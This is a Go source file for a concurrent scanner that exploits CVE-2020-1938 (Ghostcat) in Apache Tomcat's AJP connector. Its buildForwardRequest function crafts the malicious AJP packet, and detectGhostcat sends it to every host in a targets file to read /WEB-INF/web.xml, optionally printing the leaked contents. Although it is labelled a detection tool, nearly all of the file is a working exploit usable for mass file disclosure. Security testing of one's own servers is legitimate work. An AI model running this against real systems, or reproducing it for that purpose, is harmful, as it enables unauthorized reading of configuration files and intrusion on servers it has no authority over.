package main

import (
	"bufio"
	"bytes"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"os"
	"strings"
	"sync"
	"time"
)

// ─── ANSI Colors (Catppuccin Mocha — matches Watchdogs/colors) ───

const (
	clrReset    = "\x1b[0m"
	clrBold     = "\x1b[1m"
	clrDim      = "\x1b[2m"
	clrRed      = "\x1b[38;2;243;139;168m"
	clrGreen    = "\x1b[38;2;166;227;161m"
	clrYellow   = "\x1b[38;2;249;226;175m"
	clrBlue     = "\x1b[38;2;137;180;250m"
	clrMauve    = "\x1b[38;2;203;166;247m"
	clrPeach    = "\x1b[38;2;250;179;135m"
	clrSky      = "\x1b[38;2;137;220;235m"
	clrTeal     = "\x1b[38;2;148;226;213m"
	clrPink     = "\x1b[38;2;245;194;231m"
	clrText     = "\x1b[38;2;205;214;244m"
	clrOverlay  = "\x1b[38;2;127;132;156m"
	clrSurface0 = "\x1b[38;2;49;50;68m"
	clrSurface1 = "\x1b[38;2;69;71;90m"
)

// ─── AJP Protocol Constants ───

const (
	AJPHeaderServerToContainer = 0x1234
	AJPHeaderContainerToServer = 0x4142

	AJPPrefixForwardRequest = 0x02
	AJPPrefixSendHeaders    = 0x04
	AJPPrefixSendBodyChunk  = 0x03
	AJPPrefixEndResponse    = 0x05
	AJPPrefixGetBodyChunk   = 0x06

	AJPMethodGET  = 2
	AJPMethodPOST = 4

	// Attribute codes
	AJPAttrContext         = 1
	AJPAttrServletPath    = 2
	AJPAttrRemoteUser     = 3
	AJPAttrAuthType       = 4
	AJPAttrQueryString    = 5
	AJPAttrRoute          = 6
	AJPAttrSSLCert        = 7
	AJPAttrSSLCipher      = 8
	AJPAttrSSLSession     = 9
	AJPAttrReqAttribute   = 10
	AJPAttrSSLKeySize     = 11
	AJPAttrSecret         = 12
	AJPAttrStoredMethod   = 13

	AJPAttrEnd = 0xFF
)

// Common header codes (0xA0 + index, 1-based)
// Reference map for AJP protocol — used by parser's commonHeaderCodeToName()
var ajpCommonHeaders = map[string]byte{
	"accept":          0x01,
	"accept-charset":  0x02,
	"accept-encoding": 0x03,
	"accept-language": 0x04,
	"authorization":   0x05,
	"connection":      0x06,
	"content-type":    0x07,
	"content-length":  0x08,
	"cookie":          0x09,
	"cookie2":         0x0A,
	"host":            0x0B,
	"pragma":          0x0C,
	"referer":         0x0D,
	"user-agent":      0x0E,
}

// Suppress unused-variable compiler warning (map is reference documentation)
var _ = ajpCommonHeaders

// ─── AJP Packet Builder ───

// ajpString encodes a string for AJP protocol: 2-byte length + data + null terminator
func ajpString(s string) []byte {
	if s == "" {
		return []byte{0xFF, 0xFF} // null string marker
	}
	buf := make([]byte, 2+len(s)+1)
	binary.BigEndian.PutUint16(buf[0:2], uint16(len(s)))
	copy(buf[2:], s)
	buf[2+len(s)] = 0x00
	return buf
}

// ajpStringBytes encodes a byte slice as AJP string (used for binary payloads)
func ajpStringBytes(s []byte) []byte {
	if len(s) == 0 {
		return []byte{0xFF, 0xFF}
	}
	buf := make([]byte, 2+len(s)+1)
	binary.BigEndian.PutUint16(buf[0:2], uint16(len(s)))
	copy(buf[2:], s)
	buf[2+len(s)] = 0x00
	return buf
}



// buildForwardRequest builds a complete AJP Forward Request packet for Ghostcat detection.
// It sets the three javax.servlet.include.* attributes to trigger file inclusion.
func buildForwardRequest(targetFile string) []byte {
	var body bytes.Buffer

	// Prefix code (Forward Request = 0x02)
	body.WriteByte(AJPPrefixForwardRequest)
	// Method (GET = 2)
	body.WriteByte(AJPMethodGET)
	// Protocol
	body.Write(ajpString("HTTP/1.1"))
	// Request URI
	body.Write(ajpString("/"))
	// Remote addr
	body.Write(ajpString("127.0.0.1"))
	// Remote host
	body.Write(ajpString("localhost"))
	// Server name
	body.Write(ajpString("localhost"))
	// Server port
	binary.Write(&body, binary.BigEndian, uint16(80))
	// Is SSL
	body.WriteByte(0x00)

	// Number of headers (0)
	binary.Write(&body, binary.BigEndian, uint16(0))

	// Attributes — the core of the Ghostcat exploit
	// We set three javax.servlet.include.* attributes to force file inclusion

	// javax.servlet.include.request_uri = "/"
	body.WriteByte(AJPAttrReqAttribute)
	body.Write(ajpString("javax.servlet.include.request_uri"))
	body.Write(ajpString("/"))

	// javax.servlet.include.path_info = target file path
	body.WriteByte(AJPAttrReqAttribute)
	body.Write(ajpString("javax.servlet.include.path_info"))
	body.Write(ajpString(targetFile))

	// javax.servlet.include.servlet_path = "/"
	body.WriteByte(AJPAttrReqAttribute)
	body.Write(ajpString("javax.servlet.include.servlet_path"))
	body.Write(ajpString("/"))

	// End of attributes
	body.WriteByte(AJPAttrEnd)

	// Build final packet: magic (2) + length (2) + body
	packet := make([]byte, 4+body.Len())
	binary.BigEndian.PutUint16(packet[0:2], AJPHeaderServerToContainer)
	binary.BigEndian.PutUint16(packet[2:4], uint16(body.Len()))
	copy(packet[4:], body.Bytes())

	return packet
}

// ─── AJP Response Parser ───

type ajpResponse struct {
	StatusCode   int
	StatusMsg    string
	Headers      map[string]string
	BodyChunks   []string
	EndReceived  bool
	ServerHeader string
}

func parseAJPResponse(data []byte) (*ajpResponse, error) {
	resp := &ajpResponse{
		Headers: make(map[string]string),
	}

	// Parse using an offset-based approach for robustness
	offset := 0

	for offset < len(data) {
		// Need at least 4 bytes for header (magic + length)
		if offset+4 > len(data) {
			break
		}

		magic := binary.BigEndian.Uint16(data[offset : offset+2])
		if magic != AJPHeaderContainerToServer {
			break
		}

		dataLen := int(binary.BigEndian.Uint16(data[offset+2 : offset+4]))
		if dataLen == 0 || offset+4+dataLen > len(data) {
			break
		}

		// Extract the sub-packet body (after magic + length)
		packetBody := data[offset+4 : offset+4+dataLen]
		prefixByte := packetBody[0]

		switch prefixByte {
		case AJPPrefixSendHeaders: // 0x04
			resp.parseSendHeaders(packetBody[1:])

		case AJPPrefixSendBodyChunk: // 0x03
			if len(packetBody) >= 3 {
				chunkLen := int(binary.BigEndian.Uint16(packetBody[1:3]))
				if chunkLen > 0 && 3+chunkLen <= len(packetBody) {
					resp.BodyChunks = append(resp.BodyChunks, string(packetBody[3:3+chunkLen]))
				}
			}

		case AJPPrefixEndResponse: // 0x05
			resp.EndReceived = true
		}

		offset += 4 + dataLen
	}

	return resp, nil
}

// parseSendHeaders parses an AJP Send Headers sub-packet
func (resp *ajpResponse) parseSendHeaders(data []byte) {
	r := bytes.NewReader(data)

	// HTTP status code (2 bytes)
	statusBytes := make([]byte, 2)
	if _, err := io.ReadFull(r, statusBytes); err != nil {
		return
	}
	resp.StatusCode = int(binary.BigEndian.Uint16(statusBytes))

	// Status message (ajp string)
	resp.StatusMsg = readAJPString(r)

	// Number of headers (2 bytes)
	numHeadersBytes := make([]byte, 2)
	if _, err := io.ReadFull(r, numHeadersBytes); err != nil {
		return
	}
	numHeaders := int(binary.BigEndian.Uint16(numHeadersBytes))

	for i := 0; i < numHeaders; i++ {
		// Header name — either 2-byte code (0xA0xx) or string length
		codeBytes := make([]byte, 2)
		if _, err := io.ReadFull(r, codeBytes); err != nil {
			return
		}
		code := binary.BigEndian.Uint16(codeBytes)

		var headerName string
		if code >= 0xA001 && code <= 0xA00B {
			headerName = commonHeaderCodeToName(code)
		} else {
			// It's a length prefix for a custom header name
			nameLen := int(code)
			if nameLen <= 0 || r.Len() < nameLen+1 {
				return
			}
			nameBytes := make([]byte, nameLen)
			io.ReadFull(r, nameBytes)
			headerName = string(nameBytes)
			r.ReadByte() // null terminator
		}

		headerValue := readAJPString(r)
		resp.Headers[strings.ToLower(headerName)] = headerValue

		// Capture Server / Servlet-Engine header
		if strings.EqualFold(headerName, "Servlet-Engine") || strings.EqualFold(headerName, "Status") {
			resp.ServerHeader = headerValue
		}
	}
}

// readAJPString reads an AJP-encoded string from a reader
func readAJPString(r *bytes.Reader) string {
	lenBytes := make([]byte, 2)
	if _, err := io.ReadFull(r, lenBytes); err != nil {
		return ""
	}
	strLen := int(binary.BigEndian.Uint16(lenBytes))
	if strLen == 0xFFFF {
		return "" // null string
	}
	if strLen == 0 || r.Len() < strLen+1 {
		return ""
	}
	strBytes := make([]byte, strLen)
	io.ReadFull(r, strBytes)
	r.ReadByte() // null terminator
	return string(strBytes)
}

func commonHeaderCodeToName(code uint16) string {
	names := map[uint16]string{
		0xA001: "Content-Type",
		0xA002: "Content-Language",
		0xA003: "Content-Length",
		0xA004: "Date",
		0xA005: "Last-Modified",
		0xA006: "Location",
		0xA007: "Set-Cookie",
		0xA008: "Set-Cookie2",
		0xA009: "Servlet-Engine",
		0xA00A: "Status",
		0xA00B: "WWW-Authenticate",
	}
	if name, ok := names[code]; ok {
		return name
	}
	return fmt.Sprintf("Unknown-0x%04X", code)
}

// ─── Scan Result with vulnerability details ───

type VulnTarget struct {
	Host       string
	Port       int
	FilePath   string
	BodyLength int
	Took       time.Duration
	Timestamp  time.Time
}

type ScanResult struct {
	Host       string
	Port       int
	Vulnerable bool
	StatusCode int
	StatusMsg  string
	ServerInfo string
	BodyLength int
	BodyPreview string
	Error      string
	Took       time.Duration
}

// detectGhostcat connects to the target AJP port and attempts to read /WEB-INF/web.xml
// to determine if CVE-2020-1938 is exploitable.
func detectGhostcat(host string, port int, timeout time.Duration) ScanResult {
	addr := fmt.Sprintf("%s:%d", host, port)
	result := ScanResult{Host: host, Port: port}
	start := time.Now()
	defer func() { result.Took = time.Since(start) }()

	// Step 1: TCP connect with timeout
	conn, err := net.DialTimeout("tcp", addr, timeout)
	if err != nil {
		result.Error = fmt.Sprintf("connection failed: %v", err)
		return result
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(timeout))

	// Step 2: Build the Ghostcat exploit packet — try to read /WEB-INF/web.xml
	packet := buildForwardRequest("/WEB-INF/web.xml")

	// Step 3: Send the packet
	if _, err := conn.Write(packet); err != nil {
		result.Error = fmt.Sprintf("send failed: %v", err)
		return result
	}

	// Step 4: Read full AJP response (may arrive in multiple TCP segments)
	conn.SetReadDeadline(time.Now().Add(timeout))
	var respBuf bytes.Buffer
	buf := make([]byte, 8192)
	for {
		n, err := conn.Read(buf)
		if n > 0 {
			respBuf.Write(buf[:n])
		}
		if err != nil {
			if err == io.EOF {
				break
			}
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				break
			}
			break
		}
		// Check if we have at least one complete AJP response
		// (look for EndResponse 0x41 0x42 ... 0x05)
		raw := respBuf.Bytes()
		if len(raw) >= 4 {
			// Check if the response contains an EndResponse marker
			// Simple heuristic: if we've read data and no error, give it a moment
			conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
		}
	}

	rawResp := respBuf.Bytes()
	if len(rawResp) < 5 {
		result.Error = "no AJP response received (target may not be AJP or is filtered)"
		return result
	}

	// Step 5: Parse the AJP response
	resp, err := parseAJPResponse(rawResp)
	if err != nil {
		result.Error = fmt.Sprintf("response parse error: %v", err)
		return result
	}

	result.StatusCode = resp.StatusCode
	result.StatusMsg = resp.StatusMsg
	result.ServerHeader = resp.ServerHeader

	// Combine body chunks
	var fullBody string
	for _, chunk := range resp.BodyChunks {
		fullBody += chunk
	}
	result.BodyLength = len(fullBody)

	// Show first 500 chars as preview
	if len(fullBody) > 500 {
		result.BodyPreview = fullBody[:500] + "..."
	} else {
		result.BodyPreview = fullBody
	}

	// Step 6: Determine vulnerability
	// If we got a 200 response with actual file content (web.xml contains XML),
	// the target is vulnerable. Also check for 200 with non-empty body.
	if resp.StatusCode == 200 && result.BodyLength > 0 {
		result.Vulnerable = true
	}

	// Also flag if we get a 200 with content that looks like XML/config
	if resp.StatusCode == 200 && (strings.Contains(fullBody, "<?xml") ||
		strings.Contains(fullBody, "<web-app") ||
		strings.Contains(fullBody, "<servlet") ||
		strings.Contains(fullBody, "<display-name")) {
		result.Vulnerable = true
	}

	return result
}

// ─── Simple TCP port check ───

func isPortOpen(host string, port int, timeout time.Duration) bool {
	addr := fmt.Sprintf("%s:%d", host, port)
	conn, err := net.DialTimeout("tcp", addr, timeout)
	if err != nil {
		return false
	}
	conn.Close()
	return true
}

// ─── Banner / UI ───

func printBanner() {
	fmt.Println()
	fmt.Printf("%s%s", clrMauve, clrBold)
	fmt.Println("     ╔══════════════════════════════════════════════════╗")
	fmt.Println("     ║          👻 G H O S T C A T  Scanner           ║")
	fmt.Println("     ║       CVE-2020-1938  Detection Tool            ║")
	fmt.Println("     ║        Apache Tomcat AJP LFI/RCE               ║")
	fmt.Println("     ╚══════════════════════════════════════════════════╝")
	fmt.Printf("%s", clrReset)
	fmt.Printf("  %sHuntool-scr%s %s•%s Go %s\n", clrTeal, clrReset, clrDim, clrReset, clrSky)
	fmt.Println()
}

func printUsage() {
	fmt.Printf("  %sUsage:%s\n", clrBold, clrReset)
	fmt.Printf("    %sghostcat%s %s<targets-file>%s [options]\n\n", clrGreen, clrReset, clrYellow, clrReset)
	fmt.Printf("  %sOptions:%s\n", clrBold, clrReset)
	fmt.Printf("    %s-p,%s --port %s<port>%s     AJP port (default: 8009)\n", clrSky, clrReset, clrYellow, clrReset)
	fmt.Printf("    %s-t,%s --timeout %s<secs>%s   Connection timeout in seconds (default: 5)\n", clrSky, clrReset, clrYellow, clrReset)
	fmt.Printf("    %s-w,%s --workers %s<num>%s     Concurrent workers (default: 10)\n", clrSky, clrReset, clrYellow, clrReset)
	fmt.Printf("    %s-o,%s --output %s<file>%s     Output results to file\n", clrSky, clrReset, clrYellow, clrReset)
	fmt.Printf("    %s-v,%s --verbose%s            Show full response body\n\n", clrSky, clrReset, clrReset)
	fmt.Printf("  %sTargets File:%s\n", clrBold, clrReset)
	fmt.Printf("    One host per line (IP or hostname)\n")
	fmt.Printf("    %sExample:%s\n", clrDim, clrReset)
	fmt.Printf("    %s  192.168.1.10%s\n", clrOverlay, clrReset)
	fmt.Printf("    %s  192.168.1.20%s\n", clrOverlay, clrReset)
	fmt.Printf("    %s  tomcat.example.com%s\n\n", clrOverlay, clrReset)
	fmt.Printf("  %sExamples:%s\n", clrBold, clrReset)
	fmt.Printf("    %sghostcat%s targets.txt\n", clrGreen, clrReset)
	fmt.Printf("    %sghostcat%s targets.txt %s-p 8009 -w 20%s\n", clrGreen, clrReset, clrSky, clrReset)
	fmt.Printf("    %sghostcat%s targets.txt %s-o results.txt -v%s\n\n", clrGreen, clrReset, clrSky, clrReset)
}

func printResult(r ScanResult, verbose bool) {
	addr := fmt.Sprintf("%s:%d", r.Host, r.Port)

	if r.Error != "" {
		fmt.Printf("  %s✗%s %-35s %s%s%s %s(%v)%s\n",
			clrRed, clrReset,
			addr,
			clrDim, r.Error, clrReset,
			clrDim, r.Took.Round(time.Millisecond), clrReset,
		)
		return
	}

	if r.Vulnerable {
		fmt.Printf("  %s⚠ VULNERABLE%s %-25s %sTomcat AJP 8009 OPEN%s\n",
			clrRed+clrBold, clrReset,
			addr,
			clrPeach, clrReset,
		)
		fmt.Printf("    %s├──%s Status:  %s%d %s%s\n",
			clrSurface1, clrReset,
			clrRed, r.StatusCode, r.StatusMsg, clrReset,
		)
		if r.ServerHeader != "" {
			fmt.Printf("    %s├──%s Server:  %s%s%s\n",
				clrSurface1, clrReset,
				clrSky, r.ServerHeader, clrReset,
			)
		}
		fmt.Printf("    %s├──%s Body:    %s%d bytes%s\n",
			clrSurface1, clrReset,
			clrYellow, r.BodyLength, clrReset,
		)
		fmt.Printf("    %s└──%s Took:    %s%v%s\n",
			clrSurface1, clrReset,
			clrDim, r.Took.Round(time.Millisecond), clrReset,
		)
		if verbose && r.BodyPreview != "" {
			fmt.Printf("    %s── Response Body ──%s\n", clrOverlay, clrReset)
			for _, line := range strings.Split(r.BodyPreview, "\n") {
				fmt.Printf("    %s│%s %s\n", clrSurface1, clrReset, line)
			}
			fmt.Printf("    %s──────────────────%s\n", clrOverlay, clrReset)
		}
	} else {
		// Port open but not vulnerable (or got non-200)
		fmt.Printf("  %s●%s %-35s %sPort open, not vulnerable%s %s(%d, %v)%s\n",
			clrGreen, clrReset,
			addr,
			clrTeal, clrReset,
			clrDim, r.StatusCode, r.Took.Round(time.Millisecond), clrReset,
		)
	}
}

// ─── Main ───

func main() {
	printBanner()

	// Parse args manually (no external deps)
	args := os.Args[1:]
	if len(args) == 0 {
		printUsage()
		os.Exit(1)
	}

	var targetsFile string
	port := 8009
	timeout := 5
	workers := 10
	outputFile := ""
	verbose := false

	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "-p", "--port":
			if i+1 < len(args) {
				fmt.Sscanf(args[i+1], "%d", &port)
				i++
			}
		case "-t", "--timeout":
			if i+1 < len(args) {
				fmt.Sscanf(args[i+1], "%d", &timeout)
				i++
			}
		case "-w", "--workers":
			if i+1 < len(args) {
				fmt.Sscanf(args[i+1], "%d", &workers)
				i++
			}
		case "-o", "--output":
			if i+1 < len(args) {
				outputFile = args[i+1]
				i++
			}
		case "-v", "--verbose":
			verbose = true
		case "-h", "--help":
			printUsage()
			os.Exit(0)
		default:
			if !strings.HasPrefix(args[i], "-") && targetsFile == "" {
				targetsFile = args[i]
			}
		}
	}

	if targetsFile == "" {
		fmt.Printf("  %sError:%s No targets file specified.\n\n", clrRed, clrReset)
		printUsage()
		os.Exit(1)
	}

	// Read targets from file
	file, err := os.Open(targetsFile)
	if err != nil {
		fmt.Printf("  %sError:%s Cannot open '%s': %v\n", clrRed, clrReset, targetsFile, err)
		os.Exit(1)
	}
	defer file.Close()

	var targets []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			targets = append(targets, line)
		}
	}

	if len(targets) == 0 {
		fmt.Printf("  %sError:%s No targets found in '%s'\n", clrRed, clrReset, targetsFile)
		os.Exit(1)
	}

	fmt.Printf("  %s📋 Loaded %d target(s)%s from %s%s%s\n",
		clrSky, len(targets), clrReset, clrYellow, targetsFile, clrReset)
	fmt.Printf("  %s🎯 Port:%s %d  %s⏱ Timeout:%s %ds  %s⚡ Workers:%s %d\n",
		clrTeal, clrReset, port, clrTeal, clrReset, timeout, clrTeal, clrReset, workers)
	fmt.Println()
	fmt.Printf("  %s────────────────────────────────────────────────────────%s\n", clrSurface1, clrReset)

	// Open output file if specified
	var outWriter *bufio.Writer
	var outFile *os.File
	if outputFile != "" {
		outFile, err = os.Create(outputFile)
		if err != nil {
			fmt.Printf("  %sError:%s Cannot create output file: %v\n", clrRed, clrReset, err)
			os.Exit(1)
		}
		defer outFile.Close()
		outWriter = bufio.NewWriter(outFile)
		defer outWriter.Flush()
	}

	// Run scans with worker pool
	results := make(chan ScanResult, len(targets))
	vulnTargets := make(chan VulnTarget, len(targets))
	jobs := make(chan string, len(targets))
	timeoutDur := time.Duration(timeout) * time.Second

	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for host := range jobs {
				// First check if port is open (quick TCP check)
				if !isPortOpen(host, port, timeoutDur) {
					results <- ScanResult{
						Host:  host,
						Port:  port,
						Error: "port closed or host unreachable",
						Took:  timeoutDur,
					}
					continue
				}
				// Port is open, run the AJP detection
				r := detectGhostcat(host, port, timeoutDur)
				results <- r
				// If vulnerable, send to vulnTargets channel
				if r.Vulnerable {
					vulnTargets <- VulnTarget{
						Host:       r.Host,
						Port:       r.Port,
						BodyLength: r.BodyLength,
						Took:       r.Took,
						Timestamp:  time.Now(),
					}
				}
			}
		}()
	}

	// Feed jobs
	go func() {
		for _, t := range targets {
			jobs <- t
		}
		close(jobs)
	}()

	// Close results when all workers done
	go func() {
		wg.Wait()
		close(results)
	}()

	// Collect and display results
	var vulnCount, openCount, closedCount, errCount int
	// Track unique vulnerable targets
	vulnSet := make(map[string]VulnTarget)
	for r := range results {
		printResult(r, verbose)
		if r.Error != "" {
			if strings.Contains(r.Error, "port closed") {
				closedCount++
			} else {
				errCount++
			}
		} else if r.Vulnerable {
			vulnCount++
			// Store in vulnSet for summary (dedup by host:port)
			key := fmt.Sprintf("%s:%d", r.Host, r.Port)
			if _, exists := vulnSet[key]; !exists {
				vulnSet[key] = VulnTarget{
					Host:       r.Host,
					Port:       r.Port,
					BodyLength: r.BodyLength,
					Took:       r.Took,
					Timestamp:  time.Now(),
				}
			}
		} else {
			openCount++
		}

		// Write to output file
		if outWriter != nil {
			status := "CLOSED"
			if r.Error == "" && !r.Vulnerable {
				status = "OPEN_SAFE"
			} else if r.Vulnerable {
				status = "VULNERABLE"
			} else if !strings.Contains(r.Error, "port closed") {
				status = "ERROR"
			}
			line := fmt.Sprintf("%s:%d\t%s\t%d\t%s\n", r.Host, r.Port, status, r.BodyLength, r.Error)
			outWriter.WriteString(line)
		}
	}

	// Summary
	fmt.Println()
	fmt.Printf("  %s────────────────────────────────────────────────────────%s\n", clrSurface1, clrReset)
	fmt.Printf("  %s📊 Scan Summary:%s\n", clrBold, clrReset)
	fmt.Printf("    %s🔴 Vulnerable:      %d%s\n", clrRed, vulnCount, clrReset)
	fmt.Printf("    %s🟢 Open (safe):     %d%s\n", clrGreen, openCount, clrReset)
	fmt.Printf("    %s⚫ Closed/Filtered: %d%s\n", clrDim, closedCount, clrReset)
	if errCount > 0 {
		fmt.Printf("    %s🟡 Errors:          %d%s\n", clrYellow, errCount, clrReset)
	}

	// Print vulnerable targets count
	if len(vulnSet) > 0 {
		fmt.Printf("\n  %s📁 Vulnerable Targets Found: %d%s\n", clrRed, len(vulnSet), clrReset)
		fmt.Printf("  %s━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━%s\n", clrSurface1, clrReset)
		fmt.Printf("  %s%-35s %sStatus%s\n", clrBold, "Target", clrReset, clrReset)
		for key, v := range vulnSet {
			fmt.Printf("  %s⚠ %-33s %sVULNERABLE (AJP %d, %d bytes)%s\n",
				clrRed, key, clrReset, v.Port, v.BodyLength, clrReset)
		}
		fmt.Println()
	}

	if outputFile != "" {
		fmt.Printf("    %s📁 Results saved:   %s%s%s\n", clrSky, clrYellow, outputFile, clrReset)
	}
	fmt.Println()
}
